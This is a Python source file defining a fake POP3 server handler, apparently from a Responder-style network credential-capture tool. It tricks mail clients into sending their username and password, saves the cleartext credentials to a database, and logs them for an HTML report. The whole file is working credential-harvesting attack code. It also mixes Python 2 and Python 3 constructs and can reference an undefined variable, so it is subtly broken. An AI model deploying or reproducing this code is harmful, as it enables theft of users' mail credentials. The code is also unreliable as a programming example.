from utils import *
from SocketServer import BaseRequestHandler
from packets import POPOKPacket

# This variable will collect all the output for HTML rendering
output_data = []

# POP3 Server class
class POP3(BaseRequestHandler):
    def SendPacketAndRead(self):
        Packet = POPOKPacket()
        self.request.send(str(Packet))
        return self.request.recv(1024)

    def handle(self):
        global output_data
        output_data = []  # Reset output data each time

        try:
            data = self.SendPacketAndRead()

            if data[0:4] == "USER":
                User = data[5:].replace("\r\n", "")
                output_data.append(f"[POP3] Username received: {User}")
                data = self.SendPacketAndRead()

            if data[0:4] == "PASS":
                Pass = data[5:].replace("\r\n", "")
                output_data.append(f"[POP3] Password received: {Pass}")

                # Save to database
                SaveToDb({
                    'module': 'POP3',
                    'type': 'Cleartext',
                    'client': self.client_address[0],
                    'user': User,
                    'cleartext': Pass,
                    'fullhash': User + ":" + Pass,
                })
                output_data.append(f"[POP3] Cleartext credentials saved: {User}:{Pass}")

            self.SendPacketAndRead()

        except Exception as e:
            output_data.append(f"[POP3] Error: {str(e)}")

        return output_data